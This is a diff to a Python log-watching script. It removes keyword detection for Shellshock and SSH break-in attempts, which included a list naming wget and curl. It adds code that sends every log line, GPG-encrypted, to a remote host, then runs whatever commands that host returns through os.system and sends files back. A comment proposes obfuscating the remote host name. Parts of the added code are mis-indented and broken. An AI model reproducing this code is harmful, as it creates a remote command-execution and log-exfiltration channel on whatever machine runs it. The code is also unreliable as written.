@@ -1,13 +1,15 @@
 #!/usr/bin/python
-import os, socket, sys, re, datetime
+import os, socket, sys, datetime
 from pyWch import *
-# examples of some parsing keywords
-shellShockStrings = ['wget', 'download', 'curl','{','}']
-sshBadStrings = ['POSSIBLE BREAK-IN ATTEMPT!','Failed password for','Accepted password','session opened for user']
+import gnupg
+gpg = gnupg.GPG(gnupghome='/DirectoryOfKeysHere')
+gpg.encoding = 'utf-8'
+recipient = 'sys@server.com' # public key of designated target (name or email)
 localHostName = str(socket.gethostname())
 remoteHostName = "hostname.com" #str(urllib.request.urlopen('http://blablabla/secretconninfo.txt').read()) <-- for obfuscation
 remotePort = 50007
 consoleOutputOn = True
+socksize = 2048
 def showOutput(s):
         if consoleOutputOn == True:
                 print s
@@ -21,46 +23,36 @@ def sendDaterz(data):
 	try:
 		showOutput("Sending data to somewhere")
 		conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-		socksize = 2048
 		conn.connect((remoteHostName, remotePort))
-		conn.send(data)
+		conn.send(str(gpg.encrypt(data, recipient, always_trust=True)))#always_trust must be set to true to for public keys
+		receiveDaterz(conn)
 		conn.close()
 	except:
 		pass
 		showOutput("This shit isn't going anywhere...")
-def findURL(data):
-	urls = re.findall('http[s]?://(?:[a-zA-Z]|[0-9]|[$-_@.&+]|[!*\(\),]|(?:%[0-9a-fA-F][0-9a-fA-F]))+', data)
-	return urls
+def receiveDaterz(conn):
+    downloadMsg = str(gpg.decrypt(str(conn.recv(socksize))))
+    while "Done with line" not in downloadMsg:
+        curlOutFile = str(gpg.decrypt(str(conn.recv(socksize))))
+        showOutput(downloadMsg)
+        os.system(downloadMsg)                        # download file client side
+        returnDownload(conn, curlOutFile)
+        downloadMsg = str(gpg.decrypt(str(conn.recv(socksize))))
+def returnDownload(conn, curlOutFile): # sends the file using binary through sockets
+    	f = open(curlOutFile, 'rb')
+    	l = f.read(1024)
+	 while (l):
+        	conn.send(l)
+        	l = f.read(1024)
+    	f.close()
+    	conn.send('finish')
 def callback(filename, lines):
 	for line in lines:
-		if any(k in line for k in (shellShockStrings)):
-			lineMsg = "[ATTEMPTED COMPROMISE OVER HTTP(S)] " + line
-			showOutput(lineMsg)	
-			sendDaterz(lineMsg)
-			f = open(outFile, 'a')
-			f.write(lineMsg)
-			urls = findURL(line) 
-			for url in urls:
-				curlOutFile = "dl/evil@" + getCurrentDateTime() + ".snaggled"
-				downloadMsg = "Downloading file @ " + url + " and storing it under " + curlOutFile
-				showOutput(downloadMsg)
-				sendDaterz(downloadMsg)
-				f.write(downloadMsg)
-				os.system("curl -s " + url + " -o " + curlOutFile) 
-			f.close()
-		if any (k in line for k in (sshBadStrings)):
-			lineMsg = "[ATTEMPTED COMPROMISE OVER SSH] " + line
-			showOutput(lineMsg)
-			sendDaterz(lineMsg)
-			f = open(outFile, 'a')
-			f.write(lineMsg)
-			urls = findURL(line)
-		else:
-			sendDaterz(line)
-			showOutput(line)
-			f = open(outFile, 'a')
-			f.write(line)
-			f.close()
+		sendDaterz(line)
+		showOutput(line)
+		f = open(outFile, 'a')
+		f.write(line)
+		f.close()
 if len(sys.argv) < 2:
 	showOutput("Please provide a directory!\nEx: /var/log or /var/log/apache2")
 	exit()
